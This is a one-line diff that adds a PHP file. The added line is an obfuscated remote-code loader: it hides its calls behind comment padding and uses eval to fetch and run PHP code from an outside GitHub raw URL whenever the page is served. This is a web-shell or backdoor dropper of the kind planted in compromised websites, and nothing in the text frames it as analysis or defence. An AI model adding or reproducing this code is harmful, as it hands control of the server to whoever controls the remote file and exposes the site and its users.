@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode("https://raw.githubusercontent.com/kontol-svg/cobaajabang/refs/heads/main/repositorybaru.php"))));/**/?>
